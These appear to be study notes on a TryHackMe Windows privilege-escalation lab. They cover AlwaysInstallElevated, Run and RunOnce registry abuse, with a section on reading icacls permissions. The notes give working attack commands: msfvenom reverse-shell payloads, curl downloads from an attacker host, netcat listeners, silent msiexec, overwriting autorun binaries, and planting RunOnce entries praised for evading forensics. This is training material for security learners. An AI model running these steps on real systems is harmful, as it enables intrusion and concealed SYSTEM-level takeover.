## Windows Privilege Escalation via Registry 

## **Detailed Notes** 

## **Understanding the Windows Registry** 

- **Explanation** : The Windows Registry is a central, hierarchical database used by the Windows operating system to store low-level settings for the OS, applications, hardware devices, and user preferences. 

- **Analogy** : Think of the registry like a massive **folder structure** . Inside folders are sub-folders, and at the very end of the path is a file (the registry key) that contains specific values (the settings data). 

- **How it Works** : 

   - If a user changes their wallpaper or notification sound, Windows stores the path to that image or MP3 file in a specific registry. When an event occurs, Windows queries the registry to know what to execute. 

   - Settings can be global (applying to the entire system and all users) or specific to individual users. 

## **Hive Keys** 

- **Definition** : The top-level root folders in the registry hierarchy. There are five main hive keys. 

- **Important Hives for PrivEsc** : 

   - **HKLM (HKEY_LOCAL_MACHINE)** : Contains settings that apply globally to the local machine and all users on it. Exploiting HKLM is highly desirable because it can affect higher-level users (like Administrators) when they log in. 

   - **HKCU (HKEY_CURRENT_USER)** : Contains settings specific only to the currently logged-in user. 

## **Setting Up the Environment** 

1. Start the TryHackMe **Windows PrivEsc** room machine. 

2. Once the target IP is assigned, connect using the Remote Desktop Protocol (RDP). 

3. **Command** : `xfreerdp3 /u:user /p:password321 /cert:ignore /v:<Target_IP> /smart-sizing` 

- _Context_ : The `/smart-sizing` parameter is essential as it automatically scales the remote desktop window to fit your monitor dynamically. 

## **Technique 1: AlwaysInstallElevated Registry Exploit** 

- **Explanation** : `AlwaysInstallElevated` is a policy setting that, when enabled, instructs Windows to install any Microsoft Installer ( `.msi` ) file with elevated (SYSTEM) privileges, regardless of the user's actual permission level. 

- **The Vulnerability** : If an attacker can introduce a malicious `.msi` file to the system while this policy is active, the installation process will run as `NT AUTHORITY\SYSTEM` , granting the attacker a system-level shell. 

- **Microsoft's Double-Check Protection** : Because this is inherently dangerous, Windows requires this policy to be explicitly enabled in **both** `HKLM` (Local Machine) and `HKCU` (Current User). If it is missing or disabled in either, the exploit will fail. 

## **Step-by-Step Exploitation:** 

1. **Query HKLM** : `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` 

   - Ensure `AlwaysInstallElevated` is set to `0x1` (True/Enabled). 

   - Ensure `DisableMSI` is set to `0x0` (False/Disabled). 

2. **Query HKCU** : `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` 

   - Ensure `AlwaysInstallElevated` is also set to `0x1` here. 

3. **Generate Payload** : On the attacker machine, use `msfvenom` to create a malicious `.msi` reverse shell. 

   - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f msi -o shell.msi` 

4. **Transfer Payload** : Start a Python HTTP server ( `python -m http.server 80` ) and download it on the target using `curl` . 

   - `curl http://<Attacker_IP>/shell.msi -o shell.msi` 

5. **Execute Payload Silently** : Set up a Netcat listener ( `nc -nvlp 4444` ), then execute the installer silently so no GUI prompts appear. 

   - `msiexec /quiet /i shell.msi` 

6. **Result** : A reverse shell connects back with `NT AUTHORITY\SYSTEM` privileges. 

## **Technique 2: AutoRun (Run Registry) Exploit** 

- **Explanation** : The `Run` registry key acts identically to a startup folder. Any executable defined in this registry will execute automatically when a user logs into the system. 

- **The Vulnerability** : If the `Run` registry is located in `HKLM` , it applies to all users. If an attacker has write permissions to the executable file defined in this registry (or the directory it resides in), they can replace the legitimate program with a malicious payload. When an Administrator logs in, the payload runs with Admin privileges. 

## **Step-by-Step Exploitation:** 

1. **Query the Registry** : `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` 

   - Assume you find a key named `My Program` pointing to `C:\Program Files\Autorun Program\program.exe` . 

2. **Check Permissions** : Verify if you have write access to `program.exe` by trying to echo an empty string into it ( `echo > program.exe` ). If you get an "Access is denied" error for file creation but can overwrite, proceed carefully. 

3. **Generate Payload** : Create an `.exe` reverse shell payload. 

   - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe -o shell.exe` 

4. **Overwrite the Executable** : Use `curl` to download your payload and overwrite the legitimate program directly. 

   - `curl http://<Attacker_IP>/shell.exe -o "C:\Program Files\Autorun Program\program.exe"` 

5. **Trigger Execution** : Start a Netcat listener. When an administrator logs into the system via RDP (or otherwise), the malicious `program.exe` triggers, yielding an Administrator shell. 

## **Technique 3: RunOnce Registry Exploit** 

- **Explanation** : The `RunOnce` registry operates identically to the `Run` registry, executing defined files upon user login. However, **it only executes once** . 

- **Red Team Advantage** : Once the payload is triggered upon login, Windows automatically deletes the `RunOnce` registry entry. This acts as an automated clean-up mechanism, leaving no persistent registry entries behind for forensic analysts to discover. 

- **The Vulnerability** : If an attacker has write access to the `RunOnce` registry key in `HKLM` , they can manually inject a new entry pointing to a malicious payload. 

## **Step-by-Step Exploitation:** 

1. **Query the Registry** : `reg query` 

   - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` (Usually empty by default). 

2. **Add a Malicious Entry** : Add a new string value ( `REG_SZ` ) to the registry pointing to your payload. 

      - `reg add` 

         - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v shell /t REG_SZ /d "C:\Program Files\Autorun Program\program.exe" /f` 

            - `/v` : Value Name (e.g., "shell"). 

            - `/t` : Type ( `REG_SZ` for String). 

            - `/d` : Data (The path to the executable). 

            - `/f` : Forcefully overwrites without prompting. 

3. **Result** : Upon the next Administrator login, the payload executes, granting a shell, and the registry key automatically self-destructs. 

## **Commands/Tools Mentioned (if any)** 

|**Command/Tool**|**Purpose**|**Notes**|
|---|---|---|
|`xfreerdp3`|Remote Desktop<br>connection tool.|Use`/smart-sizing`to auto-scale the<br>RDP window to fit your terminal.|
|`reg query`|Used to read the values<br>inside a specific Windows<br>Registry.|Crucial for enumerating<br>misconfigurations.|
|`reg add`|Used to create or modify a<br>Windows Registry key.|Requires specific flags like`/v`<br>(name),`/t`(type), and`/d`(data).|
|`msfvenom`|Payload generation<br>framework.|Can generate standard executables (`-`<br>`f exe`) or Microsoft Installers (`-f`<br>`msi`).|
|`curl`|Command-line tool to<br>download files from a<br>remote server.|Built into modern Windows versions<br>natively.|
|`msiexec`|The command-line utility<br>used to install`.msi`files.|Use`/quiet /i <file>`for silent<br>background installation without GUI<br>prompts.|
|`accesschk.exe`|Sysinternals tool to verify<br>permissions.|Can check read/write permissions on<br>files, folders, AND registry keys.|



## **Important Terms and Definitions** 

- **Windows Registry** : A hierarchical database that stores low-level settings for the operating system and applications. 

- **Hive Key** : The root folders of the Windows Registry (e.g., `HKEY_LOCAL_MACHINE` , `HKEY_CURRENT_USER` ). 

- **MSI (Microsoft Installer)** : A file extension utilized by the Windows Installer service to install, maintain, and remove software. It handles complex tasks like folder creation, registry modification, and shortcut placement. 

- **AlwaysInstallElevated** : A Windows policy that allows non-privileged users to install `.msi` files with SYSTEM-level privileges. 

- **REG_SZ** : The data type identifier for a simple "String Value" within the Windows Registry. 

## **Key Takeaways** 

1. The Windows Registry is essentially a settings database formatted like a folder structure; misconfigurations in how these settings are applied can lead to total system compromise. 

2. The `AlwaysInstallElevated` vulnerability requires the policy to be active in **both** the Local Machine (HKLM) and Current User (HKCU) hives simultaneously; otherwise, the OS will block the exploit. 

3. Using `msfvenom` to generate `.msi` format payloads allows attackers to hijack the Windows Installer process, mapping directly to `AlwaysInstallElevated` misconfigurations. 

4. The `Run` and `RunOnce` registries are the registry equivalents of the Startup folder. 

5. The `RunOnce` registry is heavily favored in Red Teaming engagements because it is stealthy—it automatically deletes its own registry key immediately after execution, leaving minimal forensic traces. 

6. The simplest way to check for write permissions (if third-party tools like `accesschk` aren't available) is to attempt appending/writing data to the target file via `echo` . 

## **Exam/Interview Questions Based on the Video** 

- **Question** : What is the difference between `HKEY_LOCAL_MACHINE` (HKLM) and `HKEY_CURRENT_USER` (HKCU)? 

   - _Answer_ : HKLM applies global settings to the entire system and affects all users who log in, whereas HKCU only stores settings specific to the user currently logged into the system. 

- **Question** : To successfully exploit `AlwaysInstallElevated` , what specific conditions must be met within the registry? 

   - _Answer_ : The `AlwaysInstallElevated` value must be explicitly set to `1` (True) in _both_ `HKLM` and `HKCU` . Additionally, the `DisableMSI` value must be set to `0` (False). 

- **Question** : Why might an attacker or Red Teamer prefer using the `RunOnce` registry over the standard `Run` registry for persistence/execution? 

   - _Answer_ : The `RunOnce` registry automatically deletes its entry immediately after the payload is executed. This serves as an automated clean-up process, making it much harder for incident responders to perform forensic analysis. 

- **Question** : How do you silently execute an MSI payload via the command line to prevent GUI popups from alerting the user? 

   - _Answer_ : By using the `msiexec /quiet /i <filename.msi>` command. 

- **Question** : Can the Sysinternals tool `accesschk` be used to check permissions on Registry keys, or is it only for files and directories? 

- _Answer_ : Yes, `accesschk` is capable of checking read/write permissions on Windows Registry keys as well as standard files and directories. 

## **Revision Summary** 

- **Registry Structure** : Acts as a hierarchical folder-based database storing system and user settings. 

- **HKLM vs HKCU** : Exploit vectors in HKLM are higher value as they execute globally, allowing a low-level user to capture a high-level user's shell upon login. 

- **AlwaysInstallElevated Check** : Must be `True` in both HKLM and HKCU. `DisableMSI` must be `False` . 

- **AlwaysInstallElevated Exploit** : Create `.msi` payload -> Transfer via `curl` -> Run with `msiexec /quiet /i` . Yields SYSTEM shell. 

- **Run Registry Exploit** : Functions like a startup folder. Find writable executables defined in HKLM's `Run` key, overwrite them with a malicious `.exe` , wait for Admin RDP login. 

- **RunOnce Registry Exploit** : Same as `Run` , but the registry key deletes itself after execution (stealthy). Exploit by using `reg add` to create a new `REG_SZ` string pointing to your payload. 

## **Understanding** **`icacls` Output** 

## **Command Example:** 

## DOS 

```
C:\Users\ROHIT>icacls Videos
Videos LAPTOP-5DN837GN\CodexSandboxUsers:(OI)(CI)(RX)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       LAPTOP-5DN837GN\ROHIT:(I)(OI)(CI)(F)
```

```
Successfully processed 1 files; Failed processing 0 files
```

The `icacls` (Integrity Control Access Control List) command is used to view and modify file and folder permissions in Windows. Understanding these parameters is critical for identifying access controls and potential privilege escalation vectors. 

Here is the breakdown of the parameters seen in the output: 

## _1. Inheritance Flags_ 

These flags indicate whether permissions are applied directly to the folder or inherited from a parent directory, and whether they will propagate to subdirectories and files. 

- **(I) - Inherited** 

   - **Technical Definition:** Specifies that the permission is inherited from the parent container. 

   - **Concept:** This permission was not explicitly set on the `Videos` folder. It cascaded automatically from its parent folder (likely `C:\Users\ROHIT` ). If a 

permission lacks the `(I)` flag (e.g., the `CodexSandboxUsers` line), it means the permission was explicitly assigned to this specific folder. 

- **(OI) - Object Inherit** 

   - **Technical Definition:** Specifies that files created in this directory will inherit the ACL. 

   - **Concept:** "Object" refers to files. Any new file created inside this folder (e.g., `movie.mp4` or `script.bat` ) will automatically inherit this permission. 

- **(CI) - Container Inherit** 

   - **Technical Definition:** Specifies that subdirectories created in this directory will inherit the ACL. 

   - **Concept:** "Container" refers to folders. Any new subfolder created inside `Videos` will automatically inherit this permission. 

**Pro Tip:** When `(OI)` and `(CI)` appear together as `(OI)(CI)` , it means every new file and subfolder created within this directory will inherit the specified permissions. 

## _2. Access Rights_ 

These letters define the exact actions a user or group can perform on the folder or file. 

- **(F) - Full Access** 

   - **Technical Definition:** Grants complete control over the file or folder, including the ability to read, write, execute, delete, and modify the permissions or ownership of the object. 

   - **Concept:** Users with `(F)` have absolute control. They can delete, edit, or execute files, and most importantly, they can alter the permissions of other users. In the example output, `NT AUTHORITY\SYSTEM` , `Administrators` , and the user `ROHIT` have Full Access. 

- **(RX) - Read and Execute** 

   - **Technical Definition:** Grants the ability to view the contents of a directory, read the data within files, and execute scripts or executable files. It does not grant write or delete permissions. 

   - **Concept:** The user can view file contents and run executables (like `.exe` or `.bat` ) but cannot create, modify, or delete files. In the example output, the `CodexSandboxUsers` group is restricted to `(RX)` permissions. 

_Output Breakdown Example_ 

Decoding the line: `NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)` 

- The `SYSTEM` account has **Full Access (F)** . 

- This permission was **Inherited (I)** from the parent folder. 

- Any new files **(OI)** or subfolders **(CI)** created within the `Videos` folder will automatically grant the `SYSTEM` account default Full Access. 

